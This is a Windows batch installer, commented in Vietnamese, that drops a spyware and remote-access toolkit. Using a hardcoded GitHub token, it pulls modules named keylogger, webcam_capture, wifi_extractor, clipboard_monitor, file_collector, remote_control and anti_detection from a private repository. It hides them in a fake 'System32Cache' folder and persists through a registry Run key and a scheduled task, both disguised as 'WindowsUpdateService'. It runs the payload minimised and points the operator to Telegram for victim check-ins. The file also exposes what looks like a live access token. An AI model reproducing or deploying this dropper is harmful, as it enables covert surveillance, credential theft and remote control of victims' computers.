@echo off
REM ========================================
REM INSTALLER TỰ ĐỘNG - REPO PRIVATE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải tất cả file từ GitHub Private Repo
REM 2. Cài đặt thư viện Python
REM 3. Ẩn thư mục và file
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

REM Chạy bình thường - hiển thị thông báo
chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
REM ========================================

REM Kiểm tra Python
echo [CHECK] Dang kiem tra Python...
python --version >nul 2>&1
if errorlevel 1 (
    py --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Python chua duoc cai dat!
        echo Vui long cai dat Python tu https://www.python.org/downloads/
        echo.
        pause
        exit /b 1
    ) else (
        set "PYTHON_CMD=py"
    )
) else (
    set "PYTHON_CMD=python"
)
echo [OK] Tim thay Python: %PYTHON_CMD%
echo.

REM Tạo thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
echo [SETUP] Thu muc cai dat: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    echo [OK] Da tao thu muc
)
if not exist "%INSTALL_DIR%\temp" (
    mkdir "%INSTALL_DIR%\temp"
)
cd /d "%INSTALL_DIR%"
echo [OK] Da chuyen den thu muc cai dat
echo.

REM Kiểm tra curl
echo [CHECK] Dang kiem tra curl...
curl --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Curl chua duoc cai dat!
    echo Windows 10/11 co san curl, neu khong co vui long cai dat.
    pause
    exit /b 1
)
echo [OK] Curl da san sang
echo.

REM Tải tất cả file từ GitHub Private Repo
echo [1/5] Dang tai file tu GitHub...
echo.

REM Tải từng file một cách rõ ràng
echo Dang tai main_stealth.py...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py"
if errorlevel 1 (
    echo [ERROR] Khong the tai main_stealth.py!
    pause
    exit /b 1
)
if not exist "main_stealth.py" (
    echo [ERROR] File main_stealth.py khong ton tai sau khi tai!
    pause
    exit /b 1
)
echo [OK] Da tai main_stealth.py

echo Dang tai config.py...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py"
if not exist "config.py" (
    echo [ERROR] Khong the tai config.py!
    pause
    exit /b 1
)
echo [OK] Da tai config.py

echo Dang tai requirements.txt...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt"
echo [OK] Da tai requirements.txt

echo Dang tai cac file module...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "screen_recorder.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screen_recorder.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "keylogger.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/keylogger.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "telegram_sender.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/telegram_sender.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_manager.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_manager.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "stealth.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/stealth.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "hotkey_listener.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/hotkey_listener.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "internet_checker.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/internet_checker.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "performance_optimizer.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/performance_optimizer.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "anti_detection.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/anti_detection.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "updater.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/updater.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "data_manager.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/data_manager.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "clipboard_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/clipboard_monitor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "screenshot_capture.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/screenshot_capture.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_collector.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_collector.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "process_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/process_monitor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "machine_id.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/machine_id.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "remote_control.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/remote_control.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "file_receiver.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/file_receiver.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "wifi_extractor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/wifi_extractor.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "webcam_capture.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/webcam_capture.py" >nul 2>&1
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "usb_monitor.py" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/usb_monitor.py" >nul 2>&1

echo [OK] Da tai tat ca file
echo.

REM Cài đặt thư viện Python
echo [2/5] Dang cai dat thu vien Python...
echo Dang nang cap pip...
%PYTHON_CMD% -m pip install --upgrade pip --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [WARNING] Khong the nang cap pip, tiep tuc...
)
echo Dang cai dat thu vien tu requirements.txt...
%PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [WARNING] Co loi khi cai dat thu vien, nhung se tiep tuc...
)
echo [OK] Da cai dat thu vien
echo.

REM Ẩn thư mục và file
echo [3/5] Dang an thu muc va file...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
for %%f in ("%INSTALL_DIR%\*.py") do attrib +h "%%f" >nul 2>&1
echo [OK] Da an thu muc va file
echo.

REM Thêm vào Windows Startup (Registry)
echo [4/5] Dang them vao Windows Startup...
%PYTHON_CMD% -c "import winreg; import sys; import os; install_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'System32Cache'); key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, '\"' + sys.executable + '\" \"' + os.path.join(install_dir, 'main_stealth.py') + '\"'); winreg.CloseKey(key)"
if errorlevel 1 (
    echo [WARNING] Khong the them vao Registry, thu cach khac...
) else (
    echo [OK] Da them vao Registry
)

REM Tạo task scheduler (backup)
schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\main_stealth.py\"" /sc onlogon /f /rl highest >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the tao Task Scheduler
) else (
    echo [OK] Da tao Task Scheduler
)
echo.

REM Kiểm tra cài đặt thành công
echo [5/5] Dang kiem tra cai dat...
if not exist "%INSTALL_DIR%\main_stealth.py" (
    echo [ERROR] Khong tim thay main_stealth.py
    pause
    exit /b 1
)
if not exist "%INSTALL_DIR%\config.py" (
    echo [ERROR] Khong tim thay config.py
    pause
    exit /b 1
)
echo [OK] Tat ca file da duoc tai
echo.

REM Khởi động ứng dụng
echo Dang khoi dong ung dung...
start "" /min pythonw "%INSTALL_DIR%\main_stealth.py"
if errorlevel 1 (
    echo [WARNING] Khong the khoi dong bang pythonw, thu bang python...
    start "" /min %PYTHON_CMD% "%INSTALL_DIR%\main_stealth.py"
)
timeout /t 3 >nul 2>&1

REM Kiểm tra process đang chạy
tasklist /FI "IMAGENAME eq pythonw.exe" /FI "WINDOWTITLE eq *" 2>nul | find /I "pythonw.exe" >nul
if errorlevel 1 (
    tasklist /FI "IMAGENAME eq python.exe" 2>nul | find /I "python.exe" >nul
    if errorlevel 1 (
        echo [WARNING] Khong tim thay process Python dang chay
        echo Co the ung dung chua khoi dong hoac co loi.
    ) else (
        echo [OK] Tim thay process Python dang chay
    )
) else (
    echo [OK] Tim thay process pythonw.exe dang chay
)

echo.
echo ========================================
echo    CAI DAT HOAN TAT!
echo ========================================
echo.
echo Thu muc cai dat: %INSTALL_DIR%
echo Ung dung da duoc them vao Windows Startup
echo.
echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
echo Neu khong thay thong bao sau 1 phut, co the ung dung gap loi.
echo.
echo Nhan phim bat ky de dong...
pause >nul

exit /b 0
